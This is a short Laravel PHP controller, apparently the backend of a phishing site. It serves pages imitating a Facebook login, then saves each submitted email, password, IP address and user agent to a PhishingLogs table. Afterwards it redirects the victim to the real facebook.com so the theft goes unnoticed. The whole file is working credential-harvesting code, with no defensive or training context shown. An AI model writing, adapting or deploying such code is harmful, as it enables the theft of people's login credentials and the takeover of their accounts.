<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\View\View;
use App\Models\PhishingLogs;

class PhishingController extends Controller
{
    public function showLoginPage(): View
    {
        return view('phishing.facebook');
    }
    
    public function facebook()
    {
        return view('phishing.facebook-login');
    }
    
    public function captureCredentials(Request $request)
    {
        PhishingLogs::create([
            "email" => $request->email,
            "password" => $request->password,
            "ip_address" => $request->ip(),
            "user_agent" => $request->header("User-Agent"),
        ]);

        return redirect("https://facebook.com");
    }
}
